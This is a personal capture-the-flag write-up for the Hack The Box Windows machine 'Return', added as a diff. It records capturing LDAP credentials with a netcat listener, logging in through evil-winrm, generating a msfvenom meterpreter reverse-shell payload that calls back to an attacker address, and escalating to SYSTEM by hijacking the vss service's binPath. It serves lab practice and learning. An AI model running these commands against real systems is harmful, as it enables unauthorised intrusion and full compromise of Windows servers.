@@ -1,0 +1,100 @@
+Return.htb 
+
+Microsoft Server
+
+Ports open - 
+53
+80
+88
+135
+139
+389
+445
+464
+593
+636
+3268
+3269
+
+Expanded port scan. 
+5985 - winrm 
+
+It's a printer -
+
+Server admin panel reveals 
+
+server - printer.reutrn.local
+port - 389
+username - ***-*******
+password - blank
+
+SMB Enumeration - 
+
+enum4linux - tool
+
+To see what credentials are being used. Setup a listeneer using netcat over port 389, since that's what is used for LDAP. 
+
+After "confirming" settings you can get the password. 
+************ 
+
+
+EvilWinRM - tool
+-i - host
+-u username 
+-p password
+
+evil-winrm -i return.htb -u ***-******* -p '************'
+
+
+Once in, enumerate the users access to various groups etc. 
+
+net user ***-*******
+
+
+Local Group Memberships      *Print Operators      *Remote Management Use
+                             *Server Operators
+Global Group memberships     *Domain Users
+
+
+within winrm upload ./nc.exe
+
+since a regular nc session dies so quick need to ustilize msfvenom. 
+
+msfvenom -p windows/meterpreter/rever_tcp LHOST=10.10.XX.X LPORT=1234 -f exe > exploit.exe
+
+upload ./exploit.exe
+
+
+
+sc.exe config vss binPath="C:\Users\***-*******\Documents\exploit.exe"
+sc.exe stop vss
+sc.exe start vss
+
+
+Since it's not netcat.. you gotta use msfconsole. 
+
+use exploit/multi/handler
+
+
+root was tricky. 
+
+list ps and switch the process as quick as you can. Otherwise the conneciton is going to get killed quick. 
+
+
+
+
+My Summary ----
+
+I'm definitely rusty here as I haven't touched any of this stuff in months. I've also focused too closely to only Linux VMs vs windows stuff. I'm not as good with Windows stuff as *should* be. 
+
+Scan revealed the web portal where I was able to get the username pretty quick and easily. Finding the password would have taken me a while to find without any assistance. I didn't realize you could use netcat as just a regular ole listener, that was pretty cool. 
+
+After getting the password I had to find a way to get "into" the box. Initially I didn't see any high ports open. After a second, larger nmap you could see WinRM (Windows remote management) was open. Here you could authenticate with. using Evil-WinRM. Based off the commands, it looks like I've used this in the past but I had no recollection of doing so. It was a nice refresh. Basically the winrm tool utlized for linux as far as I could tell. After authenticating there, I could easily grab the user.txt file from the service accounts desktop. 
+
+Shortly after enumerating the groups that *I* was a member of I saw that I was in the server operators group. SC is the service control manager. vss is the volume shadow copy service. This is used to basically act as a placeholder service that you can exploit. Pretty useful stuff and commonly seen in ransomware. 
+
+Basically what's happening is you're executing the placeholder for vss to get the shell. Pretty neat stuff, just times out quick. 
+
+I def need more practice with metasploit / meterpreter. May just hae to find a dedicated course / module for this one. 
+
+
